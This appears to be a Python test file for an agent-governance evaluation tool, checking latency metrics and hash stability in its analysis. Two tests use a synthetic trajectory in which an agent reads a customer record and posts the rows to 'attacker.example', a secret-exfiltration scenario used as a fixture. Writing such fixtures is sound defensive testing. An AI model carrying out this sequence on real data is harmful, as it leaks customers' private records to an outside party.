"""Focused timing-contract tests (not machine-speed assertions)."""

from runtime_eval.causal_overlay import analyze, capture_governed_trajectory
from runtime_eval.causal_overlay.benchmark import run_benchmark


def test_latency_metrics_are_emitted():
    case = capture_governed_trajectory([
        {"tool": "read_customer_record",
         "args": {"customer_id": "synthetic"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example", "body": "rows"}},
    ], scenario_hint="secret_exfiltration")
    report = analyze(case, compare_replay_modes=True)
    latency = report.latency_metrics
    assert latency.canonical_governance_ms > 0
    assert latency.variable_extraction_ms > 0
    assert latency.template_construction_ms > 0
    assert latency.intervention_generation_ms > 0
    assert latency.individual_replay_ms
    assert all(value > 0 for value in latency.individual_replay_ms)
    assert latency.sequential_replay_wall_ms > 0
    assert latency.parallel_replay_wall_ms > 0
    assert latency.contribution_trace_ms > 0
    assert latency.report_construction_ms > 0
    assert latency.evidence_sealing_ms > 0
    assert latency.total_overlay_ms > 0
    assert latency.synchronous_end_to_end_ms > latency.total_overlay_ms
    assert latency.async_canonical_governance_ms == (
        latency.canonical_governance_ms)


def test_semantic_seal_excludes_wall_clock_latency():
    case = capture_governed_trajectory([
        {"tool": "read_customer_record",
         "args": {"customer_id": "synthetic"}},
        {"tool": "http_request",
         "args": {"url": "https://attacker.example", "body": "rows"}},
    ], scenario_hint="secret_exfiltration")
    first = analyze(case, replay_mode="sequential")
    second = analyze(case, replay_mode="parallel")
    assert first.latency_metrics != second.latency_metrics
    assert first.artifact_hash == second.artifact_hash


def test_benchmark_emits_required_intervention_counts():
    result = run_benchmark(repetitions=2, max_workers=2)
    assert set(result["counterfactual_replay"]) == {"1", "2", "4", "8", "16"}
    assert result["parallel_sequential_equivalent"]
    assert result["async_canonical_path_overhead"]["p50_ms"] >= 0
